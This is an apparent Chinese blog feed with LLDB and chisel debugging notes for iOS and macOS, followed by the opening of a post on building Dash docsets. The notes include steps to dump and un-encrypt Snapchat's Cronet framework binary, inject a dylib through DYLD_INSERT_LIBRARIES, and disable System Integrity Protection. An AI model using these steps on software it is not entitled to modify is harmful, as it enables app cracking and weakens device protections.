type</span><br><span class="line">error: &#39;class_getName&#39; has unknown return type; cast the call to its declared return type</span><br><span class="line"># 到这里可以看到，问题是codeString里面的代码让LLDB迷惑了。</span><br><span class="line"># 实际这种错误在LLDB里面是非常常见的。你需要告诉LLDB一个函数的返回类型，因为它无法知道那是啥。</span><br><span class="line"># 在这个case下， objc_getClassList 和 class_getName 都有未知的返回类型</span><br><span class="line"># Google一下便知这两个函数的签名如下：</span><br><span class="line"> int objc_getClassList(Class *buffer, int bufferCount);</span><br><span class="line">const char * class_getName(Class cls);</span><br><span class="line"># 所有我们需要做的事转换返回类型到正确的值就可以啦。如下：</span><br><span class="line"></span><br><span class="line">codeString &#x3D; r&#39;&#39;&#39;</span><br><span class="line">@import Foundation;</span><br><span class="line">int numClasses;</span><br><span class="line">Class * classes &#x3D; NULL;</span><br><span class="line">classes &#x3D; NULL;</span><br><span class="line">numClasses &#x3D; (int)objc_getClassList(NULL, 0);</span><br><span class="line">NSMutableString *returnString &#x3D; [NSMutableString string];</span><br><span class="line">classes &#x3D; (__unsafe_unretained Class *)malloc(sizeof(Class) *numClasses);</span><br><span class="line">numClasses &#x3D; (int)objc_getClassList(classes, numClasses);</span><br><span class="line">for (int i &#x3D; 0; i &lt; numClasses; i++) &#123;</span><br><span class="line">  Class c &#x3D; classes[i];</span><br><span class="line">  [returnString appendFormat:@&quot;%s,&quot;, (char *)class_getName(c)];</span><br><span class="line">&#125;</span><br><span class="line">free(classes);</span><br><span class="line">returnString;</span><br><span class="line"></span><br><span class="line">--debug选项是定位JIT代码中的问题的非常好的手段,调试lldb 的好方法</span><br><span class="line">expression --debug -lobjc -O --</span><br><span class="line">可以选择使用frame variable命令打印变量</span><br></pre></td></tr></table></figure>

<h3 id="基本的类："><a href="#基本的类：" class="headerlink" title="基本的类："></a>基本的类：</h3><ul>
<li>lldb.SBDebugger：在你的脚本中用来访问类的实例的类，非常中心，还处理LLDB命令的输入和输出</li>
<li>lldb.SBTarget：与被调试的可执行文件有关（相关调试文件，磁盘上的文件）。<br>你可以用SBDebugger的实例来获取到当前选择的SBTarget。然后 你就可以通过SBTarget访问大部分其余类。</li>
<li>lldb.SBProcess：SBTarget和SBProcess是一对多的关系：SBTarget管理者一个或多个SBProcess实例。SBProcess处理内存读写还有它自己的线程。</li>
<li>lldb.SBThread：管理对应线程的栈帧和stepping的控制逻辑</li>
<li>lldb.SBFrame：管理局部变量（debug信息有提供的）和当时的寄存器快照</li>
<li>lldb.SBModule：代表着一个可执行文件。</li>
<li>lldb.SBFunction：这代表着一个加载到内存中的函数（或者对应代码），它与SBFrame是一对一的关系。<br>实例是 lldb.debugger/lldb.target…<br><a href="https://lldb.llvm.org/python_reference/index.html" target="_blank" rel="noopener">https://lldb.llvm.org/python_reference/index.html</a><br><img src="pic/1.jpg" alt=""><br>演示了LLDB Python主要的几个类之间的相互关系<br><img src="pic/2.jpg" alt=""><br>暂停在某函数时几个类的交互</li>
</ul>
<h2 id="android"><a href="#android" class="headerlink" title="android"></a>android</h2><h2 id="iOS"><a href="#iOS" class="headerlink" title="iOS"></a>iOS</h2><h3 id="砸壳"><a href="#砸壳" class="headerlink" title="砸壳"></a>砸壳</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Cronet.framework git:(master) X otool -hf Cronet Fat headers</span><br><span class="line">fat_magic 0xcafebabe</span><br><span class="line">nfat_arch 2</span><br><span class="line">architecture 0  cputype 12 cpusubtype 9  capabilities 0x0</span><br><span class="line">	offset 16384 size 2749664 align 2A14 (16384)</span><br><span class="line">architecture 1 cputype 16777228 cpusubtype 0 capabilities 0x0</span><br><span class="line">	offset 2768896 size 3612224 align 2A14 (16384)</span><br><span class="line">Mach header</span><br><span class="line">	magic cputype cpusubtype caps filetype ncmds sizeofcmds flags</span><br><span class="line">	Oxfeedface 12 9 0x00 6 27 3328 0x00118085</span><br><span class="line">Mach header</span><br><span class="line">	magic cputype cpusubtype caps filetype ncmds sizeofcmds flags</span><br><span class="line">	0xfeedfacf 16777228 0 0x00 6 27 3816 0X00118085</span><br><span class="line"></span><br><span class="line">otool -arch arm64 -1 Cronet | grep crypt</span><br><span class="line">cryptoff 16384</span><br><span class="line">cryptsize 3309568</span><br><span class="line">cryptid 1</span><br><span class="line">(lldb) im li Cronet</span><br><span class="line">[0] 188F5BF7-B4C4-36EF-BB9A-976FA870F9D7 0x0000000105920000 &#x2F;private&#x2F;var&#x2F;mobile&#x2F;Containers&#x2F;Bundle&#x2F;Application&#x2F;3A4C68EB-4059-47D4-ACE6-BE9C492DF205&#x2F; Snapchat.app&#x2F;Frameworks&#x2F;Cronet.framework&#x2F;Cronet (0x0000000105920000)</span><br><span class="line">(lldb) memory read --force --outfile ~&#x2F;Desktop&#x2F;dumpoutput --binary count 3309568 16384+0x0000000105920000</span><br><span class="line">因为dump出来的文件都没有Mach-0文件头，所以在这里要先把dump出来的数据写回原 来加密的文件，以替换原来加密的部分</span><br><span class="line">2768896(之前获取的ARM64架构的偏移值)+16384(加密数据的偏移值)&#x3D;2785280(写入的加密数据在文件中的偏移值)</span><br><span class="line">seek&#x3D;n   Seek n blocks from the beginning of the output before copying.</span><br><span class="line">bs&#x3D;n     Set both input and output block size to n bytes</span><br><span class="line">conv&#x3D;value[,value ...]</span><br><span class="line">	notrunc  Do not truncate the output file.</span><br><span class="line">Cronet.framework git:(master) X dd seek&#x3D;2785280 bs&#x3D;l conv&#x3D;notrunc if&#x3D;&#x2F;Users&#x2F;monkey&#x2F;Desktop&#x2F;dumpoutput of&#x3D;.&#x2F;Cronet</span><br><span class="line">3309568+0 records in</span><br><span class="line">3309568+0 records out</span><br><span class="line">3309568 bytes transferred in 4.698067 secs (704453 bytes&#x2F;sec)</span><br><span class="line">Cronet.framework git:(master) X lipo Cronet -thin arm64 -output Cronet_arm64</span><br><span class="line">MachOView.app 修改Cronet_arm64 crypid 为0</span><br></pre></td></tr></table></figure>
<h3 id="查询按钮事件"><a href="#查询按钮事件" class="headerlink" title="查询按钮事件"></a>查询按钮事件</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">error: error: use of undeclared identifier &#39;UIApplication&#39;</span><br><span class="line">None</span><br><span class="line">(lldb) expression @import UIKit</span><br><span class="line">pviews</span><br><span class="line">   |    |    |    |    |    |    |    |    |    | &lt;UIButtonLabel: 0x101c730a0; frame &#x3D; (7.5 12.5; 69.5 20.5); text &#x3D; &#39;所有图书&#39;; opaque &#x3D; NO; userInteractionEnabled &#x3D; NO; layer &#x3D; &lt;_UILabelLayer: 0x174295a90&gt;&gt;</span><br><span class="line">   |    |    |    |    |    |    |    |    |    |    | &lt;_UILabelContentLayer: 0x170425fa0&gt; (layer)</span><br><span class="line">   |    |    |    |    |    |    |    |    | &lt;IMTouchInsetsButton: 0x101c73f60; baseClass &#x3D; UIButton; frame &#x3D; (324 5.5; 35 33); opaque &#x3D; NO; layer &#x3D; &lt;CALayer: 0x17422d880&gt;&gt;</span><br><span class="line">   |    |    |    |    |    |    |    |    |    | &lt;UIButtonLabel: 0x101c31460; frame &#x3D; (9 6.5; 35 20.5); text &#x3D; &#39;选择&#39;; opaque &#x3D; NO; userInteractionEnabled &#x3D; NO; layer &#x3D; &lt;_UILabelLayer: 0x174295360&gt;&gt;</span><br><span class="line"></span><br><span class="line">查看 “登录”按钮UIButtonLabel的响应链</span><br><span class="line">presponder 0x101c31460</span><br><span class="line">(lldb) presponder 0x101c31460</span><br><span class="line">&lt;UIButtonLabel: 0x101c31460; frame &#x3D; (9 6.5; 35 20.5); text &#x3D; &#39;选择&#39;; opaque &#x3D; NO; userInteractionEnabled &#x3D; NO; layer &#x3D; &lt;_UILabelLayer: 0x174295360&gt;&gt;</span><br><span class="line">   | &lt;IMTouchInsetsButton: 0x101c73f60; baseClass &#x3D; UIButton; frame &#x3D; (324 5.5; 35 33); opaque &#x3D; NO; layer &#x3D; &lt;CALayer: 0x17422d880&gt;&gt;</span><br><span class="line">   |    | &lt;IMToolbar: 0x101c1d8b0; baseClass &#x3D; UIToolbar; frame &#x3D; (0 20; 375 44); opaque &#x3D; NO; autoresize &#x3D; W; tintColor &#x3D; UIExtendedSRGBColorSpace 0 0.478431 1 1; layer &#x3D; &lt;CALayer: 0x174224ec0&gt;&gt;</span><br><span class="line">查看“登录”按钮的Action事件</span><br><span class="line">(lldb) pactions 0x101c73f60</span><br><span class="line">&lt;BKLibraryViewController: 0x102817600&gt;: editButtonPressed:</span><br></pre></td></tr></table></figure>
<h3 id="chisel-打印结构"><a href="#chisel-打印结构" class="headerlink" title="chisel 打印结构"></a>chisel 打印结构</h3><p>brew install chisel –verbose</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt; NSMallocBlock : 0Xl7444b6d0&gt;</span><br><span class="line">(lldb) pblock 0xl7444b6d0</span><br><span class="line"></span><br><span class="line">(lldb) pvc</span><br><span class="line">&lt;ICSplitViewController 0x10079eab0&gt;, state: appeared, view: &lt;UILayoutContainerView 0x1009261c0&gt;</span><br><span class="line">   | &lt;UIMultiColumnViewController 0x10079f410&gt;, state: appeared, view: &lt;UIView 0x1007aee70&gt;</span><br><span class="line"></span><br><span class="line">(lldb) methods 0x10079eab0</span><br><span class="line">&lt;ICSplitViewController: 0x10079eab0&gt;:</span><br><span class="line">in ICSplitViewController:</span><br><span class="line">	Properties:</span><br><span class="line">		@property (nonatomic, getter&#x3D;isDetailDimmed) BOOL detailDimmed;  (@synthesize detailDimmed &#x3D; _detailDimmed;)</span><br></pre></td></tr></table></figure>
<h4 id="对象查找"><a href="#对象查找" class="headerlink" title="对象查找"></a>对象查找</h4><p>fv    用正则查找所有类的 view 实例<br>fvc    用正则查找所有类的 view controller 实例<br>findinstances    在内存中查找某个类的所有实例<br>flicker    闪烁某个 view，用于快速定位</p>
<h4 id="对象分析"><a href="#对象分析" class="headerlink" title="对象分析"></a>对象分析</h4><p>pinternals    打印对象内部的所有实例变量<br>pkp    用 -valueForKeyPath:获取对象的数据<br>pmethods    打印类的所有方法<br>poobjc    用 ObjC++ 语言执行和获取表达式的结果，expression -O -l ObjC++ —的缩写<br>pproperties    打印对象或者类的属性<br>pivar    打印对象的某个 ivar<br>wivar    给对象的某个实例变量地址设置 watchpoint，监控变化<br>pclass    打印某个对象的类继承链<br>pbcopy    打印对象并且把结果复制到粘贴板<br>pblock    打印 block 的实现函数地址和签名<br>pactions    打印 UIControl 的 target 和 action</p>
<h4 id="视图查找"><a href="#视图查找" class="headerlink" title="视图查找"></a>视图查找</h4><p>visualize    显示 UIImage, CGImageRef, UIView 或 CALayer 的图片内容，用 Mac 的预览打开，在调试绘图时非常有用<br>taplog    打印触摸到的 view，用于快速定位<br>border    给 view 加上边框，用于定位某个 view 对象<br>unborder    移除 view 或 layer 的边框<br>caflush    修改 UI 后刷新 Core Animation 界面<br>hide    隐藏 view 或 layer<br>show    显示一个 view 或者 layer，相当于执行view.hidden = NO<br>mask    给 view 添加半透明的 mask，可以用来查找被隐藏的 view<br>unmask    移除 view layer 的 mask<br>setinput    给作为 first responder 的 text field 或 text view 输入文本<br>slowanim    减慢动画速度<br>unslowanim    动画速度回复正常<br>present    Present 一个 view controller<br>dismiss    消除 present 出来的 view controller</p>
<h4 id="视图层级"><a href="#视图层级" class="headerlink" title="视图层级"></a>视图层级</h4><p>pvc    循环打印 view controller 的层级<br>pviews    循环打印 view 的层级<br>pca    打印 layer 树<br>vs    在 view 层级中搜索 view<br>ptv    打印最顶层的 table view<br>pcells    打印最顶层 table view 的所有可见的 cell<br>presponder    打印 UIResponder 响应者链</p>
<h4 id="其他工具"><a href="#其他工具" class="headerlink" title="其他工具"></a>其他工具</h4><p>sequence    执行多条命令，用;分隔<br>pjson    打印 NSDictionary 或 NSArray 的 JSON 格式<br>pcurl    用 curl 的格式显示 NSURLRequest (HTTP)<br>pdata    用字符串的形式显示 NSData<br>mwarning    模拟内存警告</p>
<h4 id="视图调试"><a href="#视图调试" class="headerlink" title="视图调试"></a>视图调试</h4><p>alamborder    给有约束错误的 view 加上边框<br>alamunborder    有约束错误的 view 加上边框<br>paltrace    打印 view 的约束信息，相当于调用_autolayoutTrace<br>panim    是否正在执行动画，相当于调用[UIView _isInAnimationBlock]</p>
<h3 id="NSObject私有方法，可以方便查看对象的内容："><a href="#NSObject私有方法，可以方便查看对象的内容：" class="headerlink" title="NSObject私有方法，可以方便查看对象的内容："></a>NSObject私有方法，可以方便查看对象的内容：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_methodDescription：打印对象或者类的整个继承链上的方法列表，同时显示方法的地址，可以直接用于断点</span><br><span class="line">_shortMethodDescription ：打印对象或者类的方法列表，不显示父类</span><br><span class="line">_ivarDescription：打印对象或者类的所有实例变量和值</span><br></pre></td></tr></table></figure>

<h3 id="搜索UITextField的实例对象和Cycript中的choose—样的"><a href="#搜索UITextField的实例对象和Cycript中的choose—样的" class="headerlink" title="搜索UITextField的实例对象和Cycript中的choose—样的"></a>搜索UITextField的实例对象和Cycript中的choose—样的</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">search UIButton</span><br><span class="line">search UITextField</span><br><span class="line"># Find all UIViews, ignore subclasses</span><br><span class="line">find UIView  -e</span><br><span class="line"></span><br><span class="line"># Find all instances of UIViews (and subclasses) where tag &#x3D;&#x3D; 5</span><br><span class="line">find UIView -c &quot;[obj tag] &#x3D;&#x3D; 5&quot;</span><br></pre></td></tr></table></figure>
<h3 id="读取内存"><a href="#读取内存" class="headerlink" title="读取内存"></a>读取内存</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">memory read --size 4 --format x --count 4 0xbffff3c0</span><br><span class="line">me r -s4 -fx -c4 0xbffff3c0</span><br></pre></td></tr></table></figure>
<h3 id="查看对象内存关系-xcode观看"><a href="#查看对象内存关系-xcode观看" class="headerlink" title="查看对象内存关系,xcode观看"></a>查看对象内存关系,xcode观看</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;Applications&#x2F;Xcode.app&#x2F;Contents&#x2F;SharedFrameworks&#x2F;LLDB.framework&#x2F;Versions&#x2F;A&#x2F;Resources&#x2F;Python&#x2F;lldb&#x2F;macosx&#x2F;heap.py</span><br><span class="line">command alias iheap command script import lldb.macosx.heap</span><br><span class="line">&quot;malloc_info&quot;, &quot;ptr_refs&quot;, &quot;cstr_refs&quot;, &quot;find_variable&quot;, and &quot;objc_refs&quot;</span><br><span class="line"></span><br><span class="line">ptr_refs</span><br><span class="line">可以在内存中找出哪些地址引用了某个指针，也就相当于查看某个变量在哪里被引用。</span><br><span class="line"></span><br><span class="line">cstr_refs</span><br><span class="line">在内存中寻找某个C String在哪里被引用。</span><br><span class="line"></span><br><span class="line">find_variable</span><br><span class="line">在当前栈帧上寻找某个局部变量在哪里被引用。</span><br><span class="line"></span><br><span class="line">objc_refs</span><br><span class="line">在内存中寻找某个类的实例。</span><br><span class="line"></span><br><span class="line">为了查看某个对象内存分配的调用堆栈，需要在程序启动的环境变量中设置 MallocSlack Logging。</span><br><span class="line">在环境变量中增加 MallocStackLogging 的值1</span><br><span class="line">单击Xcode调试工具栏上的“Debug Momery Graph”按钮</span><br><span class="line"></span><br><span class="line">malloc_info --stack-history 0x10010d680。可以快速追溯对象的创建来源，</span><br><span class="line">参考iOS逆向：在任意app上开启malloc stack追踪内存来源</span><br><span class="line">https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;759015369b6f</span><br><span class="line">lldb有一个内存调试工具malloc stack，开启以后就可以查看某个内存地址的malloc和free记录，追踪对象是在哪里创建的。</span><br><span class="line"></span><br><span class="line">这个工具可以打印出对象创建的堆栈，而在逆向时，也经常需要追踪某些方法的调用栈，如果可以随时打印出某个对象的创建记录，也就能直接找到其所在的类和方法，不用再花费大量的时间去打log和动态调试追踪了。</span><br></pre></td></tr></table></figure>
<h3 id="执行script"><a href="#执行script" class="headerlink" title="执行script"></a>执行script</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(lldb) e @import UIKit</span><br><span class="line">(lldb) e UIApplication *$app &#x3D; [UIApplication sharedApplication];</span><br><span class="line">(lldb) e UlWindow *$keyWindow &#x3D; $app.keyWindow</span><br><span class="line">(lldb) e UlViewController *$root &#x3D; $keyWindow.rootViewController</span><br><span class="line">(lldb) po $root</span><br><span class="line">&lt;NavigationController: 0xl2c03d200&gt;</span><br><span class="line">(lldb) e [(SCButton *)0xl2bd4b760 setTitle:@&quot;AloneMonkey&quot; forStaterUIControlStateNormal]</span><br><span class="line">(lldb) e (void)[CATransaction flush]</span><br><span class="line">(lldb) c</span><br></pre></td></tr></table></figure>
<h3 id="在-Snapchat模块中查看与login有关的符号信息"><a href="#在-Snapchat模块中查看与login有关的符号信息" class="headerlink" title="在 Snapchat模块中查看与login有关的符号信息"></a>在 Snapchat模块中查看与login有关的符号信息</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">image lookup -rn login UserLogin</span><br><span class="line"></span><br><span class="line">(lldb) b -[UIView setTail:]</span><br><span class="line">Breakpoint 3: where &#x3D; UserLogin&#96;-[UIView(Frame) setTail:] at UIView+Frame.m:102, address &#x3D; 0x0000000100b5ee34</span><br><span class="line">(lldb) il 0x0000000100b5ee34</span><br><span class="line">image lookup -a 0x0000000100b5ee34</span><br></pre></td></tr></table></figure>

<h3 id="xcode-设置环境变量"><a href="#xcode-设置环境变量" class="headerlink" title="xcode 设置环境变量"></a>xcode 设置环境变量</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">打印参数和当前的环境变量, segment加载的详细信息,加载dylib,显示是否加载,各阶段的时间消耗</span><br><span class="line">xcode  DYLD_PRINT_OPTS, DYLD_PRINT_EN, DYLD_PRINT_SEGMENTS</span><br><span class="line"></span><br><span class="line">签名InsertDyUb.dylib,拷贝 InsertDylib.dylib 到Bundle Resources</span><br><span class="line">xcode  设置环境变量DYLD_INSERT_LIBRARIES @executable_path&#x2F;InsertDylib.dylib</span><br><span class="line"></span><br><span class="line">xcode  设置环境变量 DYLD_PRINT_INTERPOSING 运行 App,日志如下即为hook生效</span><br><span class="line">dyld: interposing 2 tuples onto image: &#x2F;var&#x2F;containers&#x2F;Bundle&#x2F;Application&#x2F;AB57C532-19F2-4022-B757-7D211296E64D&#x2F;AppStart.app&#x2F;InsertDylib.dylib</span><br><span class="line"></span><br><span class="line">xcode 设置 DYLD_PRINT_STATISTICS,DYLD_PRINT_STATISTICS_DETAILS 打印各阶段的时间消耗。</span><br><span class="line"></span><br><span class="line">@executable_path:表示可执行程序所在的目录，一般是xxx.app</span><br><span class="line">@loader_path:表示每一个被加载的二进制文件的目录。例如，xxxx.plugin&#x2F;aaa&#x2F;abc依赖xxx.plugin&#x2F;bb&#x2F;ccc.dylib,那么依赖的路径可以写成 @loader_path&#x2F;..&#x2F;bbb. 这样不管xxx.plugin放在那都能找到ccc.dylib</span><br><span class="line">@rpath:这个变量是在 Xcode build里面设置， Dynamic Libray Install Name设置为(#&#x3D;@path&#x2F;xxx&#x2F;xxx,就可以在使用的工程中设置一个或多个RunPath Search Paths 来指定搜索路径。在运行时，会将@rpath分别替换为Runpath Search Paths中指定的路径来査找动态库。</span><br></pre></td></tr></table></figure>

<h3 id="iOS-分析常见点"><a href="#iOS-分析常见点" class="headerlink" title="iOS 分析常见点"></a>iOS 分析常见点</h3><p>见整理的xmind</p>
<h2 id="macos"><a href="#macos" class="headerlink" title="macos"></a>macos</h2><p>查询相关 dash lldb3:<br>记录一些常用的点,基本可以用于iOS 或其他</p>
<h3 id="调试开启配置"><a href="#调试开启配置" class="headerlink" title="调试开启配置"></a>调试开启配置</h3><h4 id="wait-for-pid"><a href="#wait-for-pid" class="headerlink" title="wait for pid"></a>wait for pid</h4><p>This will tell LLDB to attach to the process named Finder whenever it next launches.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lldb -n Finder -w</span><br><span class="line">process attach --name &quot;Finder&quot; --waitfor</span><br></pre></td></tr></table></figure>
<h4 id="直接调试启动"><a href="#直接调试启动" class="headerlink" title="直接调试启动"></a>直接调试启动</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lldb -f &#x2F;bin&#x2F;ls</span><br><span class="line">process launch</span><br></pre></td></tr></table></figure>
<h4 id="将Speech框架加载到DeleteMe流程空间"><a href="#将Speech框架加载到DeleteMe流程空间" class="headerlink" title="将Speech框架加载到DeleteMe流程空间"></a>将Speech框架加载到DeleteMe流程空间</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(lldb) process load &#x2F;Applications&#x2F;Xcode.app&#x2F;Contents&#x2F;Developer&#x2F;Platforms&#x2F;iPhoneSimulator.platform&#x2F;Developer&#x2F;SDKs&#x2F;iPhoneSimulator.sdk&#x2F;&#x2F;System&#x2F;Library&#x2F;Frameworks&#x2F;Speech.framework&#x2F;Speech</span><br></pre></td></tr></table></figure>

<h4 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h4><h5 id="Disabling-Rootless"><a href="#Disabling-Rootless" class="headerlink" title="Disabling Rootless"></a>Disabling Rootless</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Command + R,start your macOS machine.</span><br><span class="line">csrutil disable &amp;&amp; reboot</span><br></pre></td></tr></table></figure>
<h4 id="w工作目录"><a href="#w工作目录" class="headerlink" title="-w工作目录"></a>-w工作目录</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">选项在哪里启动来更改当前的工作目录。输入以下内容：</span><br><span class="line">(lldb) process launch -w &#x2F;Applications</span><br></pre></td></tr></table></figure>
<h4 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h4><p>(lldb) process launch -v LSCOLORS=Af -v CLICOLOR=1  – /Applications/</p>
<h4 id="设置新目标"><a href="#设置新目标" class="headerlink" title="设置新目标"></a>设置新目标</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(lldb) target delete</span><br><span class="line">(lldb) target create &#x2F;usr&#x2F;bin&#x2F;wc</span><br></pre></td></tr></table></figure>


<h3 id="打印相关"><a href="#打印相关" class="headerlink" title="打印相关"></a>打印相关</h3><h4 id="设置后刷新"><a href="#设置后刷新" class="headerlink" title="设置后刷新"></a>设置后刷新</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">po [$rdi setHidden:!(BOOL)[$rdi isHidden]]; [CATransaction flush]</span><br></pre></td></tr></table></figure>
<h4 id="输出模块中的函数"><a href="#输出模块中的函数" class="headerlink" title="输出模块中的函数"></a>输出模块中的函数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(lldb) image lookup -rn _block_invoke Commons</span><br></pre></td></tr></table></figure>

<h3 id="调试函数单步相关"><a href="#调试函数单步相关" class="headerlink" title="调试函数单步相关"></a>调试函数单步相关</h3><h4 id="步入无符号"><a href="#步入无符号" class="headerlink" title="步入无符号"></a>步入无符号</h4><p>(lldb) step -a0<br>This tells LLDB to step in regardless of whether you have the required debug symbols or not.</p>
<h4 id="pdb调试"><a href="#pdb调试" class="headerlink" title="pdb调试"></a>pdb调试</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def your_first_command(debugger, command, result, internal_dict):</span><br><span class="line">    import pdb; pdb.set_trace()</span><br><span class="line">    print (&quot;hello world&quot;)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>tools</category>
        <category>lldb</category>
        <category>tips</category>
      </categories>
      <tags>
        <tag>lldb</tag>
        <tag>脚本</tag>
        <tag>tips</tag>
      </tags>
  </entry>
  <entry>
    <title>如何创建docset</title>
    <url>/2020/02/22/config/%E5%A6%82%E4%BD%95%E5%88%9B%E5%BB%BAdocset/</url>
    <content><![CDATA[<ul>
<li><a href="#1-docset">1. docset</a><ul>
<li><a href="#11-%e9%98%85%e8%af%bb%e6%9c%ac%e7%af%87%e6%96%87%e7%ab%a0%e9%9c%80%e6%b1%82">1.1. 阅读本篇文章需求</a></li>
<li><a href="#12-%e4%bb%80%e4%b9%88%e6%98%afdocset">1.2. 什么是docset</a></li>
<li><a href="#13-%e5%93%aa%e9%87%8c%e5%8f%af%e4%bb%a5%e4%b8%8b%e8%bd%bddocset">1.3. 哪里可以下载docset</a></li>
<li><a href="#14-%e4%b8%ba%e4%bb%80%e4%b9%88%e8%a6%81%e8%87%aa%e5%b7%b1%e7%94%9f%e6%88%90docset">1.4. 为什么要自己生成docset</a></li>
<li><a href="#15-%e5%93%aa%e9%87%8c%e8%bd%af%e4%bb%b6%e6%94%af%e6%8c%81docset">1.5. 哪里软件支持docset</a><ul>
<li><a href="#151-dash">1.5.1. dash</a></li>
<li><a href="#152-%e7%b1%bb%e4%bc%bcdash%e7%9a%84%e5%b7%a5%e5%85%b7">1.5.2. 类似dash的工具</a></li>
<li><a href="#153-%e5%ae%98%e6%96%b9%e5%b7%a5%e5%85%b7%e6%94%af%e6%8c%81%e8%87%aa%e5%ae%9a%e4%b9%89docset">1.5.3. 官方工具支持自定义docset</a><ul>
<li><a href="#1531-doc2dash">1.5.3.1. doc2dash</a></li>
<li><a href="#1532-dash-docset-builder">1.5.3.2. dash-docset-builder</a></li>
</ul>
</li>
<li><a href="#154-%e5%ae%98%e6%96%b9%e6%89%8b%e5%8a%a8%e6%96%b9%e6%b3%95%e8%87%aa%e5%ae%9a%e4%b9%89docset">1.5.4. 官方手动方法自定义docset</a></li>
<li><a href="#155-%e8%87%aa%e5%ae%9a%e4%b9%89%e7%94%9f%e6%88%90docset">1.5.5. 自定义生成docset</a><ul>
<li><a href="#1551-%e8%8e%b7%e5%8f%96htm%e5%b9%b6%e7%94%9f%e6%88%90docset">1.5.5.1. 获取htm,并生成docset</a></li>
<li><a href="#1552-%e5%88%9b%e5%bb%ba%e7%b4%a2%e5%bc%95">1.5.5.2. 创建索引</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#16-%e6%80%bb%e7%bb%93">1.6. 总结</a></li>
</ul>
</li>
</ul>
<a id="more"></a>
<h1 id="1-docset"><a href="#1-docset" class="headerlink" title="1. docset"></a>1. docset</h1><h2 id="1-1-阅读本篇文章需求"><a href="#1-1-阅读本篇文章需求" class="headerlink" title="1.1. 阅读本篇文章需求"></a>1.1. 阅读本篇文章需求</h2><p>1.知道docset是什么，后面会介绍<br>2.知道dash 如何使用，或者知道怎么使用docset</p>
<h2 id="1-2-什么是docset"><a href="#1-2-什么是docset" class="headerlink" title="1.2. 什么是docset"></a>1.2. 什么是docset</h2><p><a href="https://kapeli.com/dash_guide" target="_blank" rel="noopener">https://kapeli.com/dash_guide</a><br>Documentation sets, or docsets, consist of collections of HTML files. Dash uses these docsets to store the docs you need. This section describes the various features Dash has to help you acquire and manange docsets.<br><a href="https://fileinfo.com/extension/docset" target="_blank" rel="noopener">https://fileinfo.com/extension/docset</a><br>What is a DOCSET file?<br>Developer file created by Doxygen, a source code documentation system; contains an archive of documentation about a body of source code, which can encompass many different individual source code files and code constructs; used as the storage format for publishing documentation to developers that use the source code.</p>
<h2 id="1-3-哪里可以下载docset"><a href="#1-3-哪里可以下载docset" class="headerlink" title="1.3. 哪里可以下载docset"></a>1.3. 哪里可以下载docset</h2><p>dash.app 可以直接下<br>Docsets can be downloaded Dash’s Preferences &gt; Downloads.</p>
<h2 id="1-4-为什么要自己生成docset"><a href="#1-4-为什么要自己生成docset" class="headerlink" title="1.4. 为什么要自己生成docset"></a>1.4. 为什么要自己生成docset</h2><p>想定制一些自己查询的文档，这些文档没有别人做好的docset可以下，能找到一些html,但如果每次都查询html又觉得麻烦，所以有了自定义docset的想法。</p>
<h2 id="1-5-哪里软件支持docset"><a href="#1-5-哪里软件支持docset" class="headerlink" title="1.5. 哪里软件支持docset"></a>1.5. 哪里软件支持docset</h2><h3 id="1-5-1-dash"><a href="#1-5-1-dash" class="headerlink" title="1.5.1. dash"></a>1.5.1. dash</h3><p>作为一名程序员，最离不开的就是文档了，大多数情况下我们都是通过文档了解一个陌生的领域。想象一下，打开了一堆文档，在文档中跳来跳去，多么的不优雅！所以Bogdan Popescu一怒之下开发了dash，解放了太多在文档中跳来跳去的码农。<br>自带大量常用文档(iOS/Mac/PHP/Python/Java等)<br>支持用户自定义文档(scrapy/requests/beautifulsoup等)<br>快速搜索文档及 API<br>管理和搜索代码片段<br>无缝插入众多第三方应用(Alfred/Xcode/Terminal等)<br><img src="./pic/73436.png" alt="73436.png"></p>
<h3 id="1-5-2-类似dash的工具"><a href="#1-5-2-类似dash的工具" class="headerlink" title="1.5.2. 类似dash的工具"></a>1.5.2. 类似dash的工具</h3><p><a href="https://doc2dash.readthedocs.io/en/latest/installation.html#viewer" target="_blank" rel="noopener">https://doc2dash.readthedocs.io/en/latest/installation.html#viewer</a><br>To view the results, you will need a docset viewer, the most commonly known being Dash.app for macOS.<br>Other alternatives have been developed in cooperation with Dash.app’s developer Kapeli:<br>helm-dash for Emacs,<br>velocity for Windows,<br>and zeal for Linux, macOS, and Windows.</p>
